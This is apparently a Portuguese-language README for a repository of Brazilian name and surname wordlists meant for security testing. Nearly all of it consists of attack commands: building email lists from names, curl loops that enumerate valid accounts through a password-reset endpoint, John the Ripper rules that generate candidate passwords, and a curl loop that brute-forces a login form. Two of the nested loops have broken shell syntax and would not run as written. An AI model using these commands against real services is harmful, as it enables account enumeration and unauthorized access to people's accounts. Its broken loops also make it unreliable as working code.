# Wordlists-PT-BR
Wordlists em PT-BR, desde nomes, sobrenomes, e em breve adicionaremos endpoints em português para fuzzing. Todas as informações foram extraídas de fontes públicas.


### Criar wordlist de emails concatenando `nome.sobrenome@domain.com`
```
./wlcreator.sh nomes.txt . sobrenomes.txt domain.com emails.txt
```
### Brute Force para encontrar emails válidos - Reset Password
```
for email in `cat emails.txt`; do curl -X POST --data "email=$email" "https://domain.com.br/reset-password" -s; done
```
or
```
for nome in `cat nomes.txt`; for sobrenome in `cat sobrenomes.txt`; do curl -X POST --data "email=$nome.$sobrenome@domain.com.br" "https://domain.com.br/resetpassword" -s ; done
```
### Gerar mutação de senha através de poucos nomes fornecidos no txt
```
john --rules=all --stdout --wordlist=nomes.txt > passwords.txt 
```
### Brute Force - Login
```
for email in `cat emails.txt`; for password in `cat passwords.txt`; do curl -X POST --data "email=$email&password=$password" "https://domain.com.br/login" -s; done
```
